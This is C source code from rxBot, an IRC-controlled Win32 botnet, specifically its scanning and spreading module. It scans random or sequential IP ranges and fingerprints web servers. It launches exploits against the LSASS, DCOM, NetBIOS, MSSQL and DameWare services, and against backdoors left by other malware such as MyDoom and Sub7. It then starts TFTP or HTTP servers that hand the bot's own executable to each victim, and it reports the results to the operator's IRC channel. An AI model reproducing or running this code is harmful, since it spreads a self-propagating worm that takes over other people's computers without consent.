/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
	#ifndef NO_LSASS
	{"lsass135", "lsass135", 135, lsass, 0, TRUE, FALSE},
	{"lsass445", "lsass445", 445, lsass, 0, TRUE, FALSE},
	{"lsass1025", "lsass1025", 1025, lsass, 0, TRUE, FALSE},	
	#endif
	#ifndef NO_NETBIOS
	{"netbios", "NetBios", 139, NetBios, 0, FALSE, FALSE},
	{"ntpass", "NTPass", 445, NetBios, 0, FALSE, FALSE},
	#endif
	#ifndef NO_DCOM
	{"dcom135", "Dcom135", 135, dcom, 0, TRUE, FALSE},
	{"dcom445", "Dcom445", 445, dcom, 0, TRUE, FALSE},
	{"dcom1025", "Dcom1025", 1025, dcom, 0, TRUE, FALSE},
	#endif
	#ifndef NO_MSSQL
	{"mssql", "MSSQL", 1433, MSSQL, 0, TRUE, FALSE},
	#endif
	#ifndef NO_BEAGLE
	{"beagle1", "Beagle1", 2745, Beagle, 0, FALSE, TRUE},
	{"beagle2", "Beagle2", 2745, Beagle, 0, FALSE, TRUE},
	#endif
	#ifndef NO_MYDOOM
	{"mydoom", "MyDoom", 3127, MyDoom, 0, FALSE, FALSE},
	#endif
	#ifndef NO_OPTIX
	{"optix", "Optix", 3410, Optix, 0, FALSE, FALSE},
	#endif
	#ifndef NO_NETDEVIL
	{"netdevil","NetDevil", 901, NetDevil, 0, FALSE, FALSE},
	#endif
	#ifndef NO_DAMEWARE
	{"DameWare", "DameWare", 6129, DameWare, 0, TRUE, FALSE},
	#endif
	#ifndef NO_KUANG2
	{"kuang2", "Kuang2", 17300, Kuang, 0, FALSE, FALSE},
	#endif
	#ifndef NO_SUB7
	{"sub7", "Sub7", 27347, Sub7, 0, FALSE, FALSE},
	#endif
	{NULL, NULL, 0, NULL, 0, FALSE, FALSE}
};

void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "[SCAN]: Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "[SCAN]: Current IP: %s.",finet_ntoa(in));
	} else 
		sprintf(sendbuf ,"[SCAN]: Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			if (findthreadid(TFTP_THREAD) == 0) {
				static TFTPD tftpd;
				tftpd.port = tftpport;
				tftpd.threads = 0;
				GetModuleFileName(0,tftpd.filename,sizeof(tftpd.filename));
				strncpy(tftpd.requestname, filename, sizeof(tftpd.requestname)-1);
				tftpd.sock=scan.sock;
				tftpd.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(tftpd.chan, scan.chan, sizeof(tftpd.chan)-1);
					tftpd.silent = TRUE;
				} else {
					strncpy(tftpd.chan, scan.msgchan, sizeof(tftpd.chan)-1);
					tftpd.silent = FALSE;
				}
				
				sprintf(sendbuf, "[TFTPD]: Server started on IP: %s:%d, File: %s, Request: %s.", GetIP(tftpd.sock), tftpd.port, tftpd.filename, tftpd.requestname);
				tftpd.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftpd.threadnum].tHandle = CreateThread(NULL, 0, &TftpdThread, (LPVOID)&tftpd, 0, &id)) {
					while (tftpd.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf, "[TFTPD]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		} else if (exploit[scan.exploit].http) {
			if (findthreadid(HTTP_THREAD) == 0) {
				static HTTPD httpd;
				
				char *c;
				GetModuleFileName(0,httpd.dir,sizeof(httpd.dir));
				if ((c=strrchr(httpd.dir,'\\')) != NULL)
					*c='\0';
				httpd.port = httpport;
				httpd.enabled = FALSE;
				sprintf(httpd.chan, scan.chan);
				httpd.sock = scan.sock;
				httpd.notice = scan.notice;
				httpd.silent = scan.silent;

				sprintf(sendbuf,"[HTTPD]: Server listening on IP: %s:%d, Directory: %s\\.", GetIP(scan.sock), httpd.port, httpd.dir);

				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "[HTTPD]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned short port, unsigned int delay)
{
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons(port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

// FIX ME: racerx90, needs to finish this
BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned short port, unsigned int delay)
{
	char buffer[LOGLINE];
	int size;

	unsigned short src_port = 9801;

	TCPHEADER2 send_tcp;
	send_tcp.source = fhtons(src_port);
	send_tcp.dest = fhtons(port);
	send_tcp.seq = rand();
	send_tcp.ack_seq = 0;
	send_tcp.res1 = 0;
	send_tcp.res2 = 0;
	send_tcp.doff = 5;
	send_tcp.fin = 0;
	send_tcp.syn = 1;  /*This is the important part..;) */
	send_tcp.rst = 0;
	send_tcp.psh = 0;
	send_tcp.ack = 0;
	send_tcp.urg = 0;
	send_tcp.window = fhtons(512);
	send_tcp.check = 0;
	send_tcp.urg_ptr = 0;

	PSDHEADER psdheader;
	psdheader.saddr = src_ip;
	psdheader.daddr = dest_ip;
	psdheader.zero = 0;
	psdheader.proto = IPPROTO_TCP;
	psdheader.length = fhtons(sizeof(send_tcp));

	memcpy (&psdheader.tcp, &send_tcp, sizeof (send_tcp));
	send_tcp.check = checksum((unsigned short *)&psdheader, sizeof (psdheader));

	SOCKADDR_IN ssin;
	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(port); 
	ssin.sin_addr.s_addr = dest_ip;
	int ssin_len = sizeof(ssin);
  
	SOCKET tcp_sock = fsocket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		addlog("socket open failed");
		return FALSE;
	}

	// 10022: WSAEINVAL - An invalid argument was supplied.
	if ((size = fsendto(tcp_sock,(const char *)&send_tcp,sizeof(send_tcp),0,(LPSOCKADDR)&ssin,ssin_len)) != 20) {
		sprintf(buffer,"sendto() socket failed. sent = %d <%d>.", size, fWSAGetLastError());
		addlog(buffer);
		fclosesocket(tcp_sock);
		return FALSE;
	}

	RECVHEADER recv_tcp;
	memset (&recv_tcp,'\0',sizeof(recv_tcp));
	while (recv_tcp.tcp.dest != src_port) {
		if (frecvfrom(tcp_sock,(char *)&recv_tcp,sizeof(recv_tcp),0,(LPSOCKADDR)&ssin, &ssin_len) < 0) {
			addlog("recvfrom() socket failed");
			fclosesocket(tcp_sock);
			return FALSE;
		}
	}
  
	fclosesocket(tcp_sock);
	if (recv_tcp.tcp.syn == 1) {
		addlog("Socket open.");

		return TRUE;
	} else {
		addlog("Socket closed.");
		return FALSE;
	}
}

int AdvHttpdScannerCheckHead(EXINFO exinfo)
{	
	int iReturn=HTTP_TYPE_UNKNOWN;

	SOCKET sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sSock != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin,0,sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		if (fconnect(sSock,(LPSOCKADDR)&ssin,sizeof(ssin)) == 0) {
			DWORD mode = 1;
			fioctlsocket(sSock, FIONBIO, &mode);

			TIMEVAL timeout;
			timeout.tv_sec=5;
			timeout.tv_usec=0;
			FD_SET rset;
			FD_ZERO(&rset);
			FD_SET(sSock,&rset);

			if (fselect(0,0,&rset,0,&timeout) > 0) {
				char buffer[1024], *start;
				sprintf(buffer, "HEAD / HTTP/1.0\r\n\r\n");

				if (fsend(sSock, buffer, strlen(buffer), 0) > 0) {
					memset(buffer, 0, sizeof(buffer));

					int n;
					if((n = frecv(sSock, buffer, sizeof(buffer), 0)) > 0) {
						for (int d=0; d < n; d++) {
							if (!strncmp(buffer+d,"Server: ",strlen("Server: "))) {
								start=buffer+d+strlen("Server: ");
								for (d=0; d < (int)strlen(start); d++) {
									if (start[d] == '\n') 
										start[d]=0;
								}
							}
						}

						if (lstrcmpi(start, "Microsoft-IIS/6.0") == 0) 
							iReturn=HTTP_TYPE_IIS_60;
						else if(lstrcmpi(start, "Microsoft-IIS/5.5") == 0)
							iReturn=HTTP_TYPE_IIS_55;
						else if(lstrcmpi(start, "Microsoft-IIS/5.0") == 0)
							iReturn=HTTP_TYPE_IIS_50;
						else if(lstrcmpi(start, "Microsoft-IIS/4.0") == 0)
							iReturn=HTTP_TYPE_IIS_40;
						else if((lstrcmpi(start, "Apache/1") == 0) && (lstrcmpi(start, " (Unix) ") == 0))
							iReturn=HTTP_TYPE_APACHE_1X_UNIX;
						else if((lstrcmpi(start, "Apache/1") == 0) && (lstrcmpi(start, " (Win32) ") == 0))
							iReturn=HTTP_TYPE_APACHE_1X_WIN32;
						else if((lstrcmpi(start, "Apache/2") == 0) && (lstrcmpi(start, " (Unix) ") == 0))
							iReturn=HTTP_TYPE_APACHE_2X_UNIX;
						else if((lstrcmpi(start, "Apache/2") == 0) && (lstrcmpi(start, " (Win32) ") == 0))
							iReturn=HTTP_TYPE_APACHE_2X_WIN32; 
					}
				}
			}
		}
		fclosesocket (sSock);
	}	

	return (iReturn);
}

int AdvHttpdScannerCheckHead(EXINFO exinfo, int iReturn)
{
	SOCKET sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sSock != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		if (fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) == 0) {
			char buffer[1024];
			sprintf(buffer, "OPTIONS * HTTP/1.0\r\n\r\n");
			if (fsend(sSock, buffer, strlen(buffer), 0) > 0) {
				int n;
				memset(buffer, 0, sizeof(buffer));
				if((n = frecv(sSock, buffer, sizeof(buffer), 0)) > 0) {
					if (strncmp(buffer,"220 OK",strlen("220 OK")) != 0) {
						sprintf(buffer, "OPTIONS / HTTP/1.0\r\n\r\n");
						if (fsend(sSock, buffer, strlen(buffer), 0) > 0) { 
							memset(buffer, 0, sizeof(buffer));
							if((n = frecv(sSock, buffer, sizeof(buffer), 0)) > 0) {
								if (strncmp(buffer,"220 OK",strlen("220 OK")) != 0) {
									if (lstrcmpi(buffer, "DAV: 1, 2") == 0)
										iReturn=HTTP_OPTION_WEBDAV;
									else if(lstrcmpi(buffer, "SEARCH") == 0)
										iReturn=HTTP_OPTION_WEBDAV;
									else if(lstrcmpi(buffer, "PROPFIND") == 0)
										iReturn=HTTP_OPTION_WEBDAV;
								}
							}
						}
					}
				}
			}
		}
		fclosesocket(sSock);
	}

	return (iReturn);
}


DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = TRUE;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"[SCAN]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
		//if (SynPortOpen(finet_addr(GetIP(scan.sock)), dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"[SCAN]: IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice, TRUE);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);
				/*if (exploit[scan.exploit].exfunc(exinfo)) {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[SCAN]: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				} else {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"[SCAN]: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				}*/

			}
		}
		Sleep(500);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE]; 

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"[SCAN]: Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"[SCAN]: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
			sprintf(buffer, "[SCAN]: Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}
		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"[SCAN]: Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}
